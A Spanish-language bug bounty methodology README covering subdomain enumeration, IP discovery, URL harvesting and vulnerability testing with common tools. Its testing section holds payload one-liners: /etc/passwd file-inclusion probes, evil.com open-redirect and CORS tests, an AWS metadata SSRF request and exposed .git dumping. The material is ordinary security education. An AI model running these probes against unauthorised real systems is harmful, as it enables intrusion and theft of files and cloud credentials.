# 🐛 Metodología de bug bounty

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
            Metodología completa de búsqueda de bugs con recompensa
```

<p align="center">
  <img src="https://img.shields.io/badge/Bug_Bounty-Methodology-red?style=for-the-badge" alt="Bug Bounty">
  <img src="https://img.shields.io/badge/Recon-blue?style=for-the-badge" alt="Recon">
  <img src="https://img.shields.io/badge/Vulnerability-green?style=for-the-badge" alt="Vuln">
</p>

---

## 🗺️ Descripción del flujo de trabajo

```
┌──────────────────────────────────────────────────────────────────────────────────────┐
│                              METODOLOGÍA DE BUG BOUNTY                               │
├──────────────────────────────────────────────────────────────────────────────────────┤
│                                                                                      │
│   FASE 1: Subdominios        FASE 2: ASN e IP           FASE 3: Hosts activos        │
│   ├── Subfinder              ├── Mapeo de ASN           ├── Comprobación HTTPX       │
│   ├── Amass                  ├── Recopilación de IP     ├── Puertos                  │
│   ├── crt.sh                 └── Shodan                 └── Aquatone                 │
│   └── Wayback                                                                        │
│                                                                                      │
│   FASE 4: URL                FASE 5: Vulnerabilidades   FASE 6: Análisis profundo    │
│   ├── Katana/Hakrawler       ├── Pruebas de XSS         ├── Directorios              │
│   ├── GAU                    ├── LFI/RFI                ├── Fuzzing de parámetros    │
│   └── Extraer parámetros     ├── SSRF/CORS              └── Git expuesto             │
│                              └── Redirección abierta                                 │
│                                                                                      │
└──────────────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Índice

1. [Fase 1: enumeración de subdominios](#-fase-1-enumeración-de-subdominios)
2. [Fase 2: descubrimiento de ASN e IP](#-fase-2-descubrimiento-de-asn-e-ip)
3. [Fase 3: descubrimiento de hosts activos](#-fase-3-descubrimiento-de-hosts-activos)
4. [Fase 4: recopilación de URL](#-fase-4-recopilación-de-url)
5. [Fase 5: búsqueda de vulnerabilidades](#-fase-5-búsqueda-de-vulnerabilidades)
6. [Fase 6: descubrimiento de directorios y archivos](#-fase-6-descubrimiento-de-directorios-y-archivos)
7. [Referencia rápida](#-referencia-rápida)
8. [Instalación de herramientas](#-instalación-de-herramientas)

---

## 🔍 Fase 1: enumeración de subdominios

> **Objetivo:** encontrar tantos subdominios como sea posible: una superficie de ataque más amplia ofrece más oportunidades de encontrar vulnerabilidades.

### Herramientas de enumeración automatizada

#### Subfinder
```bash
# Descubrimiento rápido de subdominios mediante varias fuentes de datos
subfinder -d example.com -all -recursive -o subfinder.txt

# Explicación de las opciones:
# -all: utilizar todas las fuentes (gratuitas y de pago)
# -recursive: enumeración recursiva de subdominios según el original
# -o: archivo de salida
```
> 💡 **Consejo:** Subfinder es rápido y fiable. Utiliza `-all` para obtener resultados amplios.

> **Precisión de Subfinder:** `-recursive` limita la consulta a fuentes que admiten subdominios recursivos; no garantiza por sí mismo un rastreo recursivo exhaustivo. Algunas fuentes de `-all` necesitan claves API. Véase el [repositorio oficial](https://github.com/projectdiscovery/subfinder).

#### Assetfinder
```bash
# Buscar dominios y subdominios asociados a un objetivo
assetfinder --subs-only example.com > assetfinder.txt

# Rápido y sencillo: útil para el reconocimiento inicial
```
> 💡 **Consejo:** Assetfinder es rápido, pero su cobertura es menor. Úsalo junto con otras herramientas.

#### Sublist3r
```bash
# Enumeración de subdominios mediante técnicas OSINT
sublist3r -d example.com -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt

# -e: especificar los motores de búsqueda
# -v: salida detallada
```

#### Amass
```bash
# Mapeo profundo de la superficie de ataque (una herramienta potente)
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt

# Modo pasivo: no contacta directamente con el objetivo
# Utilizar -active para obtener más resultados (con más tráfico)
```
> ⚠️ **Advertencia:** Amass en modo activo puede generar mucho tráfico. ¡Empieza por el modo pasivo!

### Fuentes públicas

#### Transparencia de certificados (crt.sh)
```bash
# Buscar subdominios en los registros de certificados SSL
curl -s https://crt.sh\?q\=\example.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' > crtsh.txt
```
> 💡 **¿Por qué crt.sh?** Los registros de certificados SSL son públicos: ¡información gratuita sobre subdominios!

#### Wayback Machine
```bash
# Descubrimiento de subdominios históricos en archivos web
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | sort | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
```
> 💡 **Consejo práctico:** algunos subdominios antiguos pueden seguir existiendo aunque se hayan olvidado: ¡merece la pena revisarlos!

### Procesamiento de subdominios

#### Combinar resultados y eliminar duplicados
```bash
# Combinar todos los archivos de subdominios y eliminar duplicados
cat *.txt | sort -u > final_subdomains.txt

# Contar los resultados
wc -l final_subdomains.txt
```

#### Descubrimiento de subdominios por fuerza bruta con FFUF
```bash
# Descubrir subdominios por fuerza bruta mediante listas de palabras
ffuf -u "https://FUZZ.example.com" -w wordlist.txt -mc 200,301,302

# -mc: seleccionar únicamente códigos de estado concretos
# Lista sugerida: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Permutaciones de subdominios con Alterx
```bash
# Generar permutaciones de subdominios y resolverlas
subfinder -d example.com | alterx | dnsx

# Ampliar el dominio con patrones habituales
echo example.com | alterx -enrich | dnsx

# Utilizar una lista de palabras para las permutaciones
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```
> 💡 **Ejemplo:** si encuentras `dev.example.com`, alterx genera `dev1`, `dev2`, `dev-api`, etc.

---

## 🌐 Fase 2: descubrimiento de ASN e IP

> **Objetivo:** encontrar rangos de IP e infraestructura asociados a la organización objetivo.

### Mapeo de ASN

```bash
# Descubrir direcciones IP asociadas al ASN del dominio
asnmap -d example.com | dnsx -silent -resp-only

# Descubrir activos por el nombre de la organización
amass intel -org "organization_name"

# Descubrir activos dentro de un rango de IP
amass intel -active -cidr 159.69.129.82/32

# Descubrir activos por número de ASN
amass intel -active -asn [asnno]
```
> 💡 **¿Por qué buscar ASN?** Las organizaciones pueden disponer de rangos de IP completos: ¡permite descubrir servidores poco visibles!

> **Interpretación de infraestructura:** las IP y los certificados históricos pueden corresponder a infraestructura compartida, CDN o servicios de terceros. La asociación técnica no confirma propiedad actual ni pertenencia al alcance del programa.

### Recopilación de direcciones IP

#### VirusTotal
```bash
# Extraer direcciones IP de VirusTotal
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### AlienVault OTX
```bash
# Obtener direcciones IP de AlienVault Open Threat Exchange
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### URLScan.io
```bash
# Extraer direcciones IP de URLScan.io
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

#### Búsqueda de certificados SSL en Shodan
```bash
# Buscar direcciones IP mediante certificados SSL en Shodan
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```
> 💡 **Consejo práctico:** la búsqueda SSL de Shodan permite encontrar servidores que utilizan el certificado del objetivo, incluso los menos visibles.

---

## ✅ Fase 3: descubrimiento de hosts activos

> **Objetivo:** filtrar los subdominios para encontrar únicamente hosts activos y accesibles.

### Comprobación HTTP con HTTPX

```bash
# Comprobación básica en varios puertos
cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt

# Comprobación detallada con códigos de estado, títulos y detección de tecnologías
cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200

# Opciones:
# -sc: código de estado
# -title: título de la página
# -server: cabecera Server
# -td: detección de tecnologías
```

### Reconocimiento visual con Aquatone

```bash
# Capturar pantallas de los hosts activos
cat hosts.txt | aquatone

# Puertos personalizados
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443

# Lista ampliada de puertos (cobertura amplia)
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```
> 💡 **¿Por qué hacer capturas?** Permiten identificar rápidamente aplicaciones de interés, paneles de inicio de sesión y páginas de error.

---

## 🔗 Fase 4: recopilación de URL

> **Objetivo:** recopilar tantas URL como sea posible para probar parámetros y buscar vulnerabilidades.

### Rastreo activo

#### Katana
```bash
# Rastreador web rápido para descubrir URL
katana -u livesubdomains.txt -d 2 -o urls.txt

# -d 2: profundidad de 2 niveles
# Rápido y eficiente para aplicaciones web modernas
```

#### Hakrawler
```bash
# Rastreador web sencillo y rápido
cat urls.txt | hakrawler -u > crawled_urls.txt
```

> **Datos históricos:** filtrar un código HTTP guardado por una fuente pasiva no verifica que la URL siga respondiendo actualmente con ese código; comprueba su estado cuando corresponda al flujo de pruebas.

### Recopilación pasiva de URL

#### GAU (Get All URLs, obtener todas las URL)
```bash
# Obtener URL conocidas de AlienVault OTX, Wayback Machine y Common Crawl
cat livesubdomains.txt | gau | sort -u > passive_urls.txt

# Obtener URL con código de estado 200 y eliminar duplicados
echo example.com | gau --mc 200 | urldedupe > urls.txt
```
> 💡 **¿Por qué GAU?** Encuentra URL en datos históricos que pueden revelar endpoints ocultos.

#### URLFinder
```bash
# Buscar URL en varias fuentes
urlfinder -d example.com | sort -u > urlfinder_urls.txt
```

### Extracción de parámetros

```bash
# Extraer URL con parámetros (muy útiles para las pruebas)
cat allurls.txt | grep '=' | urldedupe | tee params_urls.txt

# Búsqueda por patrones de parámetros
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee params_urls.txt

# Patrón SQLi de GF: URL potencialmente vulnerables a inyección SQL
cat allurls.txt | gf sqli

# Patrón XSS de GF
cat allurls.txt | gf xss

# Patrón LFI de GF
cat allurls.txt | gf lfi
```
> 💡 **Patrones GF:** instala `gf` y descarga los patrones de github.com/1ndianl33t/Gf-Patterns

---

## 🔓 Fase 5: búsqueda de vulnerabilidades

### 🔴 Descubrimiento de XSS

#### Pruebas de XSS reflejado
```bash
# Cadena completa de pruebas de XSS reflejado según el original
subfinder -d "example.com" -all -recursive | \
httpx -mc 200 -silent | \
sed -E 's,https?://(www\.)?,,' | anew | \
urlfinder -all | \
iconv -f ISO-8859-1 -t UTF-8 -c | \
grep -aE '\?.*=.*(&.*)?' | \
grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | \
awk -F'[?&=]' '!seen[$1$2]++' | anew
```

#### Pruebas de XSS ciego
```bash
# Pruebas de XSS ciego con payloads específicos
# Utilizar servicios como XSS Hunter o Burp Collaborator
# Insertar el payload en los campos de entrada, cabeceras y parámetros
```
> 💡 **XSS ciego:** el payload se ejecuta más tarde, cuando un administrador consulta los datos. Utiliza un servidor de callbacks para detectar esa ejecución.

> **Alcance del pipeline XSS:** la cadena anterior recopila y filtra URL candidatas; no inyecta un payload ni verifica ejecución de JavaScript. Los patrones GF son heurísticas y requieren validación manual.

### 🔴 Descubrimiento de LFI

```bash
# Pruebas de LFI con FFUF y detección del archivo passwd
echo "https://example.com/" | gau | gf lfi | uro | \
sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | \
xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# Pruebas de LFI con curl y procesamiento paralelo
gau example.com | gf lfi | qsreplace "/etc/passwd" | \
xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Prueba de LFI con HTTPx
echo 'https://example.com/index.php?page=' | \
httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
```
> 💡 **Consejo sobre LFI:** prueba `/etc/passwd`, `....//....//etc/passwd` y variantes codificadas.

### 🔴 Descubrimiento de redirecciones abiertas

```bash
# Buscar parámetros de redirección
cat urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|next=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_url=|rurl=|target=|to=|url=" | tee redirect_params.txt

# Patrón de redirección de GF
cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt

# Probar los parámetros de redirección
cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"

# Cadena completa para redirecciones abiertas
subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

> **Validación de redirecciones:** encontrar `evil.com` en una respuesta después de seguir redirecciones es solo un indicio. Verifica el destino efectivo y la cabecera `Location`; una coincidencia en el cuerpo puede producir un falso positivo.

### 🔴 Descubrimiento de SSRF

```bash
# Buscar parámetros propensos a SSRF
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Buscar patrones de API y webhooks
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Escaneo SSRF con Nuclei
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/

# Prueba básica de SSRF contra localhost
curl "https://example.com/page?url=http://127.0.0.1:80/"

# SSRF contra metadatos cloud (AWS)
curl "https://example.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
```
> ⚠️ **Impacto de SSRF:** puede permitir acceder a servicios internos, metadatos cloud y otros recursos.

### 🔴 Pruebas de CORS

```bash
# Probar la configuración CORS con un origen personalizado
curl -H "Origin: http://evil.com" -I https://example.com/api/

# Análisis detallado de CORS
curl -H "Origin: http://evil.com" -I https://example.com/api/ | \
grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

# Escaneo automatizado de CORS con Nuclei
cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```
> 💡 **Vulnerabilidad CORS según el original:** si aparece `Access-Control-Allow-Origin: *` con credenciales, ¡se considera crítica!

> **Corrección de CORS:** `Access-Control-Allow-Origin: *` junto con credenciales no demuestra por sí solo una vulnerabilidad crítica: los navegadores bloquean la lectura de respuestas autenticadas con ese comodín. Comprueba un origen concreto no confiable, la política de credenciales y los datos realmente accesibles. Véase la [documentación de Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSNotSupportingCredentials).

### Escaneo de vulnerabilidades con Nuclei

```bash
# Un solo objetivo
nuclei -u https://example.com -bs 50 -c 30

# Varios objetivos
nuclei -l live_domains.txt -bs 50 -c 30

# Solo severidad crítica y alta
nuclei -l live_domains.txt -s critical,high -bs 50 -c 30

# -bs: tamaño del lote de objetivos
# -c: concurrencia
```

---

## 📂 Fase 6: descubrimiento de directorios y archivos

### Descubrimiento de archivos sensibles

```bash
# Extensiones básicas de archivos sensibles
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

# Expresión regular ampliada de archivos sensibles
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

# Dork de Google para archivos
# site:*.example.com (ext:doc OR ext:docx OR ext:pdf OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:sql OR ext:bak OR ext:conf OR ext:log)
```

### Descubrimiento de directorios por fuerza bruta

#### Dirsearch
```bash
# Descubrimiento básico de directorios
dirsearch -u https://example.com --full-url --deep-recursive -r

# Ampliado con varias extensiones
dirsearch -u https://example.com -e php,cgi,htm,html,js,txt,bak,zip,old,conf,log,asp,aspx,jsp,sql,json,xml,yml,yaml,py,rb --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects
```

#### Descubrimiento de directorios con FFUF
```bash
# Descubrimiento exhaustivo de directorios por fuerza bruta con FFUF
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
-u https://example.com/FUZZ \
-fc 400,401,402,403,404,429,500,501,502,503 \
-recursion -recursion-depth 2 \
-e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env \
-ac -c \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
-t 10
```

### Detección de repositorios Git expuestos

```bash
# Detectar directorios .git expuestos
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

# Comprobar si está expuesto .git/config
curl -s https://example.com/.git/config

# Descargar el repositorio Git si está expuesto
git-dumper https://example.com/.git/ output/
```
> ⚠️ **Exposición de Git:** puede revelar código fuente, credenciales y secretos.

### Descubrimiento de parámetros ocultos con Arjun

```bash
# Descubrimiento pasivo de parámetros
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

# Descubrimiento activo de parámetros con una lista de palabras
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

### Toma de control de subdominios (subdomain takeover)

```bash
# Detección automatizada de toma de control de subdominios
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
> 💡 **Indicios de takeover:** un CNAME que apunta a un servicio sin reclamar (S3, Heroku, etc.).

### Pruebas de WordPress

```bash
# Escaneo completo de seguridad de WordPress
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_API_TOKEN \
-e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# -e at: todos los temas
# -e ap: todos los plugins
# -e u: usuarios
```

---

## 📊 Referencia rápida

### Cadena de reconocimiento

```bash
# 1. Enumeración de subdominios
subfinder -d example.com -all -recursive -o subs.txt
amass enum -passive -d example.com >> subs.txt
cat subs.txt | sort -u > all_subs.txt

# 2. Descubrimiento de hosts activos
cat all_subs.txt | httpx -ports 80,443,8080,8000 -threads 200 > alive.txt

# 3. Recopilación de URL
cat alive.txt | gau | sort -u > urls.txt
cat alive.txt | katana -d 2 >> urls.txt

# 4. URL con parámetros
cat urls.txt | grep '=' | urldedupe > params.txt

# 5. Escaneo de vulnerabilidades
nuclei -l alive.txt -s critical,high -o nuclei_results.txt
```

### Comandos esenciales de una línea

| Finalidad | Comando |
|---------|---------|
| Buscar subdominios | `subfinder -d target.com -silent` |
| Comprobar los hosts activos | `cat subs.txt \| httpx -silent` |
| Obtener todas las URL | `echo target.com \| gau` |
| Buscar parámetros | `cat urls.txt \| grep '='` |
| Probar redirecciones | `cat urls.txt \| gf redirect` |
| Escaneo con Nuclei | `nuclei -l hosts.txt -s critical,high` |

### Extensiones de archivo que buscar

| Tipo | Extensiones |
|------|------------|
| **Configuración** | `.env, .config, .conf, .ini, .yml, .yaml` |
| **Copias de seguridad** | `.bak, .old, .backup, .zip, .tar.gz` |
| **Código fuente** | `.php, .asp, .aspx, .jsp, .py, .rb` |
| **Datos** | `.sql, .db, .sqlite, .json, .xml` |
| **Documentos** | `.pdf, .doc, .docx, .xls, .xlsx` |

---

> **Compatibilidad de ejemplos:** se conservan opciones y rutas de versiones del original, incluidos Amass v4, la API v2 de VirusTotal y rutas de plantillas Nuclei. Comprueba la ayuda de la versión instalada. Los nombres `subdomain.txt`, `livesubdomains.txt`, `allurls.txt` y otros archivos intermedios no se generan de manera uniforme: deben corresponder a las salidas de tu flujo.

<a id="-instalación-de-herramientas"></a>
## 🛠️ Instalación de herramientas

### Herramientas esenciales

```bash
# Subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# HTTPX
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Katana
go install github.com/projectdiscovery/katana/cmd/katana@latest

# GAU
go install github.com/lc/gau/v2/cmd/gau@latest

# FFUF
go install github.com/ffuf/ffuf/v2@latest

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

# Assetfinder
go install github.com/tomnomnom/assetfinder@latest
```

### Herramientas para XSS y redirecciones

```bash
# OR (herramienta de pruebas de redirecciones abiertas)
go install -v github.com/h6nt3r/or@latest

# RC (XSS reflejado)
go install -v github.com/h6nt3r/rc@latest

# CXSS (escáner de XSS contextual)
go install github.com/haxshadow/cxss@latest

# XSSER
go install -v github.com/h6nt3r/xsser@latest

# GF (patrones de grep)
go install github.com/tomnomnom/gf@latest
```

### Herramientas auxiliares

```bash
# URO (eliminación de URL duplicadas)
pip3 install uro

# Arjun (descubrimiento de parámetros)
pip3 install arjun

# Subzy (detección de toma de control)
go install -v github.com/PentestPad/subzy@latest
```

---

## 🎯 Consejos de bug bounty

1. **Automatiza y verifica manualmente** - Las herramientas encuentran candidatos; tú confirmas las vulnerabilidades
2. **Revisa robots.txt y sitemap.xml** - A menudo revelan rutas ocultas
3. **Revisa los archivos JavaScript** - Pueden contener endpoints de API, secretos y credenciales incrustadas
4. **Prueba todos los parámetros** - También los ocultos (con Arjun)
5. **Encadena vulnerabilidades** - SSRF + XSS puede aumentar el impacto
6. **La calidad del informe importa** - Incluye una prueba de concepto clara, el impacto y los pasos de reproducción
7. **Ten paciencia** - Encontrar fallos relevantes lleva tiempo

---

## 📚 Guías rápidas relacionadas

- [Nuclei](../../Nuclei/translations/README.es.md)
- [ffuf](../../ffuf/translations/README.es.md)
- [Subfinder](../../Subfinder/translations/README.es.md)
- [httpx](../../httpx/translations/README.es.md)
- [Google Dorking](../../Google-Dorking/translations/README.es.md)
- [Burp Suite](../../Burp-Suite/translations/README.es.md)

---

<p align="center">
  <b>🐛 ¡Buena caza!</b><br>
  <i>Bug bounty: donde la constancia puede dar sus frutos</i>
</p>
